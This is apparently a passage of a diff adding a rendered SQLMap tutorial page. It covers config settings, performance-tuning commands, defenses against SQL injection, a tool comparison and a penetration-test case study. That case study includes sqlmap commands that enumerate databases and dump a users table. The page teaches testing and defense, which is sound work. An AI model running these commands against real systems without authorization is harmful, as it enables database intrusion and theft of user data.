+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="dt">cookie </span><span class="ot">=</span><span class="st"> </span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="kw">[Request]</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="dt">delay </span><span class="ot">=</span><span class="st"> </span><span class="dv">0</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="dt">timeout </span><span class="ot">=</span><span class="st"> </span><span class="dv">30</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="dt">retries </span><span class="ot">=</span><span class="st"> </span><span class="dv">3</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="dt">randomize-user-agent </span><span class="ot">=</span><span class="st"> </span><span class="kw">True</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a><span class="kw">[Injection]</span></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a><span class="dt">technique </span><span class="ot">=</span><span class="st"> BEUSTQ</span></span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a><span class="dt">threads </span><span class="ot">=</span><span class="st"> </span><span class="dv">5</span></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a><span class="dt">level </span><span class="ot">=</span><span class="st"> </span><span class="dv">1</span></span>
+<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a><span class="dt">risk </span><span class="ot">=</span><span class="st"> </span><span class="dv">1</span></span>
+<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a><span class="kw">[Detection]</span></span>
+<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a><span class="dt">string-match </span><span class="ot">=</span><span class="st"> </span></span>
+<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a><span class="dt">not-string-match </span><span class="ot">=</span><span class="st"> </span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="performance-tuning" class="level3">
+<h3 class="anchored" data-anchor-id="performance-tuning">Performance Tuning</h3>
+<p>To improve SQLMap’s performance:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Use multiple threads</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--threads</span><span class="op">=</span>5</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Specify the injection technique</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--technique</span><span class="op">=</span>BEU</span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Use faster time delays for blind injection</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://example.com/page.php?id=1"</span> <span class="at">--time-sec</span><span class="op">=</span>1</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="defensive-measures-against-sql-injection" class="level2">
+<h2 class="anchored" data-anchor-id="defensive-measures-against-sql-injection">Defensive Measures Against SQL Injection</h2>
+<p>Understanding SQLMap helps in implementing proper defenses against SQL injection:</p>
+<section id="prevention-techniques" class="level3">
+<h3 class="anchored" data-anchor-id="prevention-techniques">Prevention Techniques</h3>
+<ol type="1">
+<li><strong>Use Parameterized Queries</strong></li>
+</ol>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Unsafe</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> <span class="st">"SELECT * FROM users WHERE username = '"</span> <span class="op">+</span> username <span class="op">+</span> <span class="st">"'"</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Safe (parameterized)</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> <span class="st">"SELECT * FROM users WHERE username = ?"</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>cursor.execute(query, (username,))</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="2" type="1">
+<li><strong>Implement Input Validation</strong></li>
+</ol>
+<div class="sourceCode" id="cb19"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Validate input type</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> <span class="bu">isinstance</span>(user_id, <span class="bu">int</span>):</span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">raise</span> <span class="pp">ValueError</span>(<span class="st">"User ID must be an integer"</span>)</span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Validate input format</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> re.match(<span class="vs">r'^\w+$'</span>, username):</span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">raise</span> <span class="pp">ValueError</span>(<span class="st">"Username contains invalid characters"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="3" type="1">
+<li><strong>Use ORM (Object-Relational Mapping)</strong></li>
+</ol>
+<div class="sourceCode" id="cb20"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Using SQLAlchemy (Python ORM)</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> session.query(User).<span class="bu">filter</span>(User.username <span class="op">==</span> username).first()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="4" type="1">
+<li><strong>Apply the Principle of Least Privilege</strong></li>
+</ol>
+<div class="sourceCode" id="cb21"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co">-- Create limited-privilege database user</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">CREATE</span> <span class="fu">USER</span> <span class="st">'app_user'</span>@<span class="st">'localhost'</span> <span class="kw">IDENTIFIED</span> <span class="kw">BY</span> <span class="st">'password'</span>;</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="kw">GRANT</span> <span class="kw">SELECT</span>, <span class="kw">INSERT</span> <span class="kw">ON</span> app_db.<span class="op">*</span> <span class="kw">TO</span> <span class="st">'app_user'</span>@<span class="st">'localhost'</span>;</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="5" type="1">
+<li><strong>Implement WAF Protection</strong></li>
+</ol>
+<p>Configure your WAF to detect and block SQL injection attempts, including those from SQLMap.</p>
+</section>
+</section>
+<section id="comparing-sqlmap-with-other-sql-injection-tools" class="level2">
+<h2 class="anchored" data-anchor-id="comparing-sqlmap-with-other-sql-injection-tools">Comparing SQLMap with Other SQL Injection Tools</h2>
+<table class="caption-top table">
+<colgroup>
+<col style="width: 33%">
+<col style="width: 33%">
+<col style="width: 33%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>Tool</th>
+<th>Pros</th>
+<th>Cons</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><strong>SQLMap</strong></td>
+<td>- Comprehensive features<br>- Active development<br>- Large community<br>- Extensive database support</td>
+<td>- Can be noisy<br>- Learning curve for advanced features</td>
+</tr>
+<tr class="even">
+<td><strong>sqlninja</strong></td>
+<td>- Specialized for MS SQL Server<br>- Good for evading IDS</td>
+<td>- Limited database support<br>- Less active development</td>
+</tr>
+<tr class="odd">
+<td><strong>NoSQLMap</strong></td>
+<td>- Supports NoSQL databases<br>- Good for MongoDB</td>
+<td>- Limited compared to SQLMap<br>- Fewer features</td>
+</tr>
+<tr class="even">
+<td><strong>Havij</strong></td>
+<td>- Simple GUI<br>- Easy to use</td>
+<td>- Discontinued<br>- Windows only</td>
+</tr>
+<tr class="odd">
+<td><strong>jsQL</strong></td>
+<td>- Java-based<br>- Cross-platform GUI</td>
+<td>- Less feature-rich<br>- Slower development</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="case-study-real-world-sqlmap-usage" class="level2">
+<h2 class="anchored" data-anchor-id="case-study-real-world-sqlmap-usage">Case Study: Real-World SQLMap Usage</h2>
+<section id="scenario-security-assessment-of-a-web-application" class="level3">
+<h3 class="anchored" data-anchor-id="scenario-security-assessment-of-a-web-application">Scenario: Security Assessment of a Web Application</h3>
+<p>A security team was tasked with assessing a web application for SQL injection vulnerabilities. They used SQLMap as part of their methodology:</p>
+<ol type="1">
+<li><strong>Reconnaissance</strong>: The team identified potential injection points in the application.</li>
+<li><strong>Initial Testing</strong>: They used SQLMap to test these points with basic options.</li>
+</ol>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"https://target-app.com/products.php?id=123"</span> <span class="at">--random-agent</span> <span class="at">--level</span><span class="op">=</span>3</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="3" type="1">
+<li><strong>Vulnerability Confirmation</strong>: SQLMap identified a blind SQL injection vulnerability in the “id” parameter.</li>
+<li><strong>Database Enumeration</strong>: The team enumerated the database structure.</li>
+</ol>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"https://target-app.com/products.php?id=123"</span> <span class="at">--random-agent</span> <span class="at">--dbs</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"https://target-app.com/products.php?id=123"</span> <span class="at">--random-agent</span> <span class="at">-D</span> customer_db <span class="at">--tables</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="5" type="1">
+<li><strong>Data Extraction</strong>: They extracted sensitive data to demonstrate the impact.</li>
+</ol>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"https://target-app.com/products.php?id=123"</span> <span class="at">--random-agent</span> <span class="at">-D</span> customer_db <span class="at">-T</span> users <span class="at">--dump</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="6" type="1">
+<li><strong>Reporting</strong>: The team reported the vulnerability with proof of concept and recommended fixes.</li>
+</ol>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/450.png" class="img-fluid figure-img"></p>
+<figcaption>SQLMap Case Study</figcaption>
+</figure>
+</div>
+</section>
+</section>
+<section id="conclusion" class="level2">
+<h2 class="anchored" data-anchor-id="conclusion">Conclusion</h2>
+<p>SQLMap remains one of the most powerful and essential tools for identifying and exploiting SQL injection vulnerabilities. Its extensive feature set, active development, and broad database support make it invaluable for security professionals conducting penetration tests and vulnerability assessments.</p>
+<p>However, with great power comes great responsibility. SQLMap should only be used ethically and legally, with proper authorization from system owners. Understanding how SQLMap works not only helps security professionals identify vulnerabilities but also helps developers implement proper defenses against SQL injection attacks.</p>
+<p>As web applications continue to evolve, SQLMap keeps pace with new injection techniques and database systems, ensuring it remains relevant in the ever-changing landscape of web security.</p>
+</section>
+<section id="resources-for-further-learning" class="level2">
+<h2 class="anchored" data-anchor-id="resources-for-further-learning">Resources for Further Learning</h2>
+<ul>
+<li><a href="http://sqlmap.org/">Official SQLMap Documentation</a></li>
+<li><a href="https://github.com/sqlmapproject/sqlmap">SQLMap GitHub Repository</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP SQL Injection Prevention Cheat Sheet</a></li>
+<li><a href="https://github.com/sqlmapproject/sqlmap/wiki">SQLMap Wiki</a></li>
+<li><a href="https://www.offensive-security.com/pwk-oscp/">Penetration Testing with Kali Linux Course</a></li>
+</ul>
 
 
+</section>
 
 </main> <!-- /main -->
 <script id="quarto-html-after-body" type="application/javascript">
